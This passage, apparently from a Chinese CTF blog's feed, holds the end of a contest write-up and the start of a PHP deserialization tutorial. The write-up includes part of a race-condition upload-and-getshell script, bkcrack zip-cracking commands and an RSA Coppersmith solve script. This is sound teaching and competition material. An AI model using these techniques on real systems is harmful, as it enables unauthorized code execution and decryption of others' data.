operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>threads<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>t <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>upload<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 开始扫描连接判断是否开启</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>t2 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>getshell<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>threads<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>threads<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>t2<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#这里还涉及一个知识点，想要更高效率的发包，就设置一个 header 头 Connection:close，请求完毕就会</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#将 connection 关闭，这样就不会占用连接。</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#如果不设置也能跑，只不过要跑很多次，就要看运气了，我这个脚本跑了一下很快就出了</span></pre></td></tr></table></figure><h3 id=\"do-you-know-cc\"><a class=\"anchor\" href=\"#do-you-know-cc\">#</a> <strong>Do you know CC</strong></h3>\n<p>cc 链，不会。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbGlrZW95dC5naXRodWIuaW8vMjAyMy8wOS8xMS9TSUNURi0lRTYlQjElQUElRTYlQjElQUElRTklOTglOUZXUC8=\">汪汪队的 wp</span></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"fast_morse\"><a class=\"anchor\" href=\"#fast_morse\">#</a> fast_morse</h3>\n<p>摩斯密码，长波短替换，或者使用 kali 的 morse2ascii 命令，不过最后得注意换成小写，附上一个在线网站：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb3JzZWNvZGUud29ybGQvaW50ZXJuYXRpb25hbC9kZWNvZGVyL2F1ZGlvLWRlY29kZXItZXhwZXJ0Lmh0bWw=\">Morse Code Audio Decoder | Morse Code World</span></p>\n<h3 id=\"babyzip\"><a class=\"anchor\" href=\"#babyzip\">#</a> <strong>babyzip</strong></h3>\n<p>bkcrack 明文爆破。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20venlzZ216Yi9wLzE2ODM0NjAyLmh0bWw=\">一位 misc 佬的链接</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvZGF0YWJhc2UvMzU1MjQ0Lmh0bWw=\">关于 bkcrack</span></p>\n<p>先把 png 的头写到一个文件内。</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/zip.png\" alt=\"zip\" height=\"100px\" width=\"700px\" /></p>\n<p>bkcrack 攻击.</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bkcrack.exe <span class=\"token parameter variable\">-C</span> flag.zip <span class=\"token parameter variable\">-c</span> flag.png <span class=\"token parameter variable\">-p</span> plan.out <span class=\"token parameter variable\">-o</span> <span class=\"token number\">0</span></pre></td></tr></table></figure><p>提取出 flag.png。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bkcrack.exe <span class=\"token parameter variable\">-C</span> flag.zip <span class=\"token parameter variable\">-c</span> flag.png <span class=\"token parameter variable\">-k</span> 6424c164 7c334afd f99666e5 <span class=\"token parameter variable\">-d</span> flag.png</pre></td></tr></table></figure><p>最后在 png 的尾部找到 flag。</p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"签到古典大杂烩\"><a class=\"anchor\" href=\"#签到古典大杂烩\">#</a> [签到] 古典大杂烩</h3>\n<p>给了一串表情密码：</p>\n<blockquote>\n<p>🐩👃🐪🐼👅🐯🐩👈👇👭👟👝🐺🐭👉👙👤👋👚🐪🐫👍👢👮👱🐼👢👨👠👭🐽🐰🐻👚👂👧👠👥👛👮👯👮👬🐾👐👛👌👚👞🐨👏👉👆🐿👆👘👇🐺👦🐸👃🐭👟👑👪👃👁🐻🐻👜🐧👇👊🐧🐾🐼👇🐫🐺👐👆👪🐼👋👌👧🐻👐🐩🐺👥🐽👋👉🐰👎👠👠👣🐧🐫👧🐭👢🐯👑👑🐮👂👏🐻👥👚🐮👋👬👌👥👁👣👅👧👯👦👌👌👍👠👌🐽👉👃👊🐫👉🐨🐮👩👆🐪🐯👘👏👏🐼👩👍👊👍👡👀👰👋👣👨👧👍👜👐👛🐮👘👅👠🐿👂👰👄👈👝👠👤👃👛👘🐭👅👱👆👬👫👥👆🐽👁👐👥👊👇👉👊👩👌👭🐫🐫👬👱🐯👇🐺👁👞👑👙🐮👜👋👘👪👩👚👦👨👀👩👐👉👃🐾👥👀🐫👝👍🐩🐧👰👆👇👨🐪👃🐭👦🐫👱</p>\n</blockquote>\n<p>最后解密方式为</p>\n<p>Base100 → Base62 → Base64 → Base58 → Base32 → Base62</p>\n<p>或者使用工具 ciphey:</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/c.png\" alt=\"c\" height=\"150px\" width=\"650px\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzY0NjkwNjY1L2FydGljbGUvZGV0YWlscy8xMzIwMDI0Nzc/c3BtPTEwMDEuMjEwMS4zMDAxLjY2NTAuMiZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFWXVhbkxpSmlIdWElN0VQb3NpdGlvbi0yLTEzMjAwMjQ3Ny1ibG9nLTExODg2MTA4OC4yMzUlNUV2MzglNUVwY19yZWxldmFudF9hbnRpX3QzX2Jhc2UmYW1wO2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFWXVhbkxpSmlIdWElN0VQb3NpdGlvbi0yLTEzMjAwMjQ3Ny1ibG9nLTExODg2MTA4OC4yMzUlNUV2MzglNUVwY19yZWxldmFudF9hbnRpX3QzX2Jhc2UmYW1wO3V0bV9yZWxldmFudF9pbmRleD01\">附上下载链接</span></p>\n<h3 id=\"easy_coppersmith\"><a class=\"anchor\" href=\"#easy_coppersmith\">#</a> Easy_CopperSmith</h3>\n<p>RSA 的 p 高位泄露。</p>\n<p>源码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PLAINTEXT</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>leak <span class=\"token operator\">=</span> p <span class=\"token operator\">>></span> <span class=\"token number\">230</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># sage</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> sage<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cop</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    n <span class=\"token operator\">=</span> <span class=\"token number\">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    p4<span class=\"token operator\">=</span> Integer<span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    e <span class=\"token operator\">=</span> <span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    pbits <span class=\"token operator\">=</span> <span class=\"token number\">512</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    kbits <span class=\"token operator\">=</span> pbits <span class=\"token operator\">-</span> p4<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p4<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p4 <span class=\"token operator\">=</span> p4 <span class=\"token operator\">&lt;&lt;</span> kbits</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    f <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> p4</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    roots <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>kbits<span class=\"token punctuation\">,</span> beta<span class=\"token operator\">=</span><span class=\"token number\">0.4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> roots<span class=\"token punctuation\">:</span>        </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        p <span class=\"token operator\">=</span> p4<span class=\"token operator\">+</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"n: \"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>   </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"p: \"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"q: \"</span><span class=\"token punctuation\">,</span> n<span class=\"token operator\">/</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        flag <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>inverse_mod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">/</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'SICTF'</span> <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    leak_ <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span><span class=\"token number\">6833525680083767201563383553257365403889275861180069149272377788671845720921410137177</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"&#123;:03b&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    cop<span class=\"token punctuation\">(</span>leak_<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>结语：本次比赛受益良多，在做 web 的同时也感受到其他方向的乐趣，尤其是几道社工题，虽然后面是在社不动了......</p>\n<p>期待明年的 Round3。</p>\n",
            "tags": [
                "CTF",
                "无敌的Web",
                "php是世界上最好的语言",
                "我就是歪脖",
                "又坐牢了"
            ]
        },
        {
            "id": "https://p1kap1.github.io/knowledge/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3/",
            "url": "https://p1kap1.github.io/knowledge/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3/",
            "title": "php反序列化的奇思妙想no.1",
            "date_published": "2023-09-04T16:00:00.000Z",
            "content_html": "<h4 id=\"起\"><a class=\"anchor\" href=\"#起\">#</a> 起：</h4>\n<p>反序列化作为 CTF 比赛的热点，从从 Orange 在 2017 年的 hitcon 出了一个 0day 的 php phar:// 反序列化给整个安全界开启了新世界的大门以后，就开始持续升温。</p>\n<p>要想明白反系列化到底是个啥玩意，</p>\n<h4 id=\"首先得知道什么是序列化\"><a class=\"anchor\" href=\"#首先得知道什么是序列化\">#</a> 首先得知道什么是序列化？</h4>\n<p><img data-src=\"../../images/Iknowyouwillstop/1.jpg\" alt=\"1\" height=\"200px\" width=\"200px\" /></p>\n<p>以下是系统的说法：</p>\n<blockquote>\n<p>序列化就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p>\n</blockquote>\n<h4 id=\"为什么php要有序列化\"><a class=\"anchor\" href=\"#为什么php要有序列化\">#</a> 为什么 php 要有序列化？</h4>\n<p>这其实是为了解决 PHP 对象传递的一个问题，因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个界面恰好要用到刚刚销毁的对象就会束手无策，总不能永远不让它销毁吧？</p>\n<p>于是人们就想出了一种能长久保存对象的方法，这就是 php 序列化的由来。</p>\n<p>所以序列化的目的就是为了方便数据的传输和存储，这也就得出了<strong> xml、json、字节数组</strong>等序列化格式。</p>\n<p>在 PHP 中，序列化和反序列化一般用做缓存，比如 session 缓存，cookie 等。</p>\n<p><img data-src=\"../../images/Iknowyouwillstop/2.jpg\" alt=\"2\" height=\"300px\" width=\"300px\" /></p>\n<p>序列化示例：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'P2hm1n'</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$sex</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'secret'</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'20'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$test1</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$object</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>关键函数 serialize (): 将 PHP 中创建的对象，变成一个字符串</p>\n<p>private 属性序列化的时候格式是 %00 类名 %00 成员名</p>\n<p>protected 属性序列化的时候格式是 %00*%00 成员名</p>\n<p>关键要点：</p>\n<p>在 Private 权限私有属性序列化的时候格式是 %00 类名 %00 属性名</p>\n<p>在 Protected 权限序列化的时候格式是 %00*%00 属性名</p>\n<h5 id=\"举个例子\"><a class=\"anchor\" href=\"#举个例子\">#</a> 举个例子：</h5>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test1</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test2</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$test3</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// O:4:\"test\":3:&#123;s:11:\" test test1\";s:5:\"hello\";s:5:\"test2\";s:5:\"hello\";s:8:\" * test3\";s:5:\"hello\";&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p s:11:testtest1;s:5:hello;s:5:test2;s:5:hello;s:8:*test3;s:5:hello;=\"\">test 类定义了三个不同类型 (私有，公有，保护) 但是值相同的字符串，序列化输出的值不相同 O:4:&quot;test&quot;:3:</p>\n<p s:11:\\00test\\00test1;s:5:hello;s:5:test2;s:5:hello;s:8:\\00*\\00test3;s:5:hello;=\"\">通过对网页抓取输出是这样的 O:4:&quot;test&quot;:3:</p>\n<p>private 的参数被反序列化后变成 \\00test\\00test1 public 的参数变成 test2 protected 的参数变成 \\00*\\00test3</p>\n<p>你可能会发现这样一个问题，假如你这个类定义了那么多方法，怎么把对象序列化了以后全都丢了？你看你整个序列化的字符串里面全是属性，就没有一个方法，这是为啥？</p>\n<blockquote>\n<p>请记住，序列化他只序列化属性，不序列化方法，这个性质就引出了两个非常重要的话题：</p>\n</blockquote>\n<p>1) 我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在</p>\n<p>这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。</p>\n<p>(2) 我们在反序列化攻击的时候也就是依托类属性进行攻击</p>\n<p>因为没有序列化方法嘛，我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击（这是我们攻击的核心思想，这里先借此机会抛出来，大家有一个印象）</p>\n<h5 id=\"反序列化示例\"><a class=\"anchor\" href=\"#反序列化示例\">#</a> 反序列化示例：</h5>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$object</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'经过序列化的字符串'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$object1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>关键函数 unserialize (): 将经过序列化的字符串转换回 PHP 值</p>\n<p>当有 protected 和 private 属性的时候记得补齐空的字符串。</p>\n<h4 id=\"为什么会产生反序列化漏洞\"><a class=\"anchor\" href=\"#为什么会产生反序列化漏洞\">#</a> 为什么会产生反序列化漏洞？</h4>\n<h5 id=\"概念解释\"><a class=\"anchor\" href=\"#概念解释\">#</a> 概念解释</h5>\n<p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，是因为程序对输入数据处理不当导致的.</p>\n<p>反序列化漏洞的成因在于代码中的 unserialize () 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p>\n<h5 id=\"需要具备反序列化漏洞的前提\"><a class=\"anchor\" href=\"#需要具备反序列化漏洞的前提\">#</a> 需要具备反序列化漏洞的前提：</h5>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>必须有 <span class=\"token function\">unserailize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">unserailize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数的参数必须可控（为了成功达到控制你输入的参数所实现的功能，可能需要绕过一些魔法函数</pre></td></tr></table></figure><h4 id=\"反序列化中常见的魔术方法\"><a class=\"anchor\" href=\"#反序列化中常见的魔术方法\">#</a> 反序列化中常见的魔术方法</h4>\n<p>让我们看看吧</p>\n<p><img data-src=\"../../images/Iknowyouwillstop/3.jpg\" alt=\"3\" height=\"300px\" width=\"300px\" /></p>\n<p>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议定义函数不要以 __为前缀。 常见的魔法方法如下：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__<span class=\"token function\">construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，类的构造函数</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>__<span class=\"token function\">destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，类的析构函数</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td 